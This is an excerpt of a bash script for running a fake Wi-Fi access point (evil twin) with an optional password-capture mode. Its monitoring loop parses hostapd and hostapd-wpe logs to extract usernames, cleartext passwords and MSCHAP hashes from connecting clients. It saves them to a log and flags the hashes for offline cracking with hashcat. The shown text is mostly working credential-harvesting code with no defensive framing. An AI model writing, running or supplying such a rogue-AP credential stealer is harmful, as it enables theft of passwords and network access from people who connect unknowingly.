...
Usage:
  sudo $0 SSID CHANNEL UPLINK_IF [MON_IF] [--capture-auth]
    SSID           - Fake AP name
    ...
    --capture-auth - (Optional) Enable WPA2 to capture password attempts
...
Examples:
  ...
  sudo $0 "TestAP" 11 wlan1 wlan0 --capture-auth
  sudo $0 stop eth0
  sudo $0 status
...
[[ "$CAPTURE_AUTH" == "true" ]] && echo "Mode: WPA2 Password Capture ENABLED" >> "$AUTH_LOG" || echo "Mode: Open AP (No password capture)" >> "$AUTH_LOG"
echo "========================================" >> "$AUTH_LOG"
echo >> "$AUTH_LOG"
...
if [[ "$CAPTURE_AUTH" == "true" ]]; then
  ...
  echo -e "${RED}╚═══════════════════════════════════════════════════╝${NC}"
  echo -e "${YELLOW}Captured passwords will be saved to: $AUTH_LOG${NC}"
fi
...
while true; do
  ...
  # Monitor hostapd/hostapd-wpe log for password attempts
  if [[ "$CAPTURE_AUTH" == "true" ]] && [[ -f "$AIRBASE_LOG" ]]; then
    ...
    if [[ $CURRENT_LOG_SIZE -gt $LAST_LOG_SIZE ]]; then
      ...
      tail -n "$NEW_LINES" "$AIRBASE_LOG" | while IFS= read -r line; do
        ...
        # hostapd-wpe password captures (most reliable)
        if echo "$line" | grep -iq "mschap.*hash\|username:\|password:"; then
          MAC=$(echo "$line" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | head -1)
          
          # Extract username
          if echo "$line" | grep -iq "username:"; then
            USERNAME=$(echo "$line" | sed -n 's/.*username: *\([^ ]*\).*/\1/p' | tr -d '\r\n')
            if [[ -n "$USERNAME" ]]; then
              echo "[$TIMESTAMP] 📧 USERNAME captured: $USERNAME" | tee -a "$AUTH_LOG"
          ...
          if echo "$line" | grep -iq "password:"; then
            PASSWORD_CAPTURED=$(echo "$line" | sed -n 's/.*password: *\([^ ]*\).*/\1/p' | tr -d '\r\n')
            if [[ -n "$PASSWORD_CAPTURED" ]]; then
              ...
              log_warn "🔑 PASSWORD CAPTURED: $PASSWORD_CAPTURED"
            fi
          fi
          
          # MSCHAP hash (can be cracked offline)
          if echo "$line" | grep -iq "mschap.*hash"; then
            HASH=$(echo "$line" | grep -oE 'hash: *[^ ]+' | cut -d: -f2 | tr -d ' ')
            if [[ -n "$HASH" ]]; then
              echo "[$TIMESTAMP] 🔐 MSCHAP Hash captured: $HASH" | tee -a "$AUTH_LOG"
              log_info "🔐 Hash captured (can be cracked with hashcat)"
            fi
          fi
        fi
        
        # Regular hostapd authentication attempts
        if echo "$line" | grep -iq "STA.*WPA:"; then
          MAC=$(echo "$line" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | head -1)
          
          if [[ -n "$MAC" ]]; then
            echo "[$TIMESTAMP] 🔐 WPA Authentication attempt from: $MAC" | tee -a "$AUTH_LOG"
            log_warn "🔐 Auth attempt from $MAC"
          fi
        fi
        
        # PMK/PTK derivation (indicates password was entered)
        if echo "$line" | grep -iq "PMK from EAPOL state machine\|WPA: sending.*msg"; then
          MAC=$(echo "$line" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | head -1)
          
          if [[ -n "$MAC" ]]; then
            echo "[$TIMESTAMP] 🔓 Client $MAC entered a password" | tee -a "$AUTH_LOG"
            log_info "🔓 Password entered by $MAC"
          fi
        fi
        
        # 4-way handshake completion
        if echo "$line" | grep -iq "AP-STA-CONNECTED\|EAPOL-4WAY.*COMPLETED"; then
          MAC=$(echo "$line" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | head -1)
          
          if [[ -n "$MAC" ]]; then
            echo "[$TIMESTAMP] ✅ Client $MAC completed authentication (password accepted)" | tee -a "$AUTH_LOG"
            log_info "✅ Client $MAC authenticated"
          fi
        fi
        
        # Failed authentication (wrong password)
        if echo "$line" | grep -iq "authentication failed\|FAILED\|denied"; then
          MAC=$(echo "$line" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | head -1)
          
          if [[ -n "$MAC" ]]; then
            echo "[$TIMESTAMP] ❌ Failed authentication from: $MAC (wrong password)" | tee -a "$AUTH_LOG"
            log_warn "❌ Wrong password from $MAC"
          fi
        fi
      done
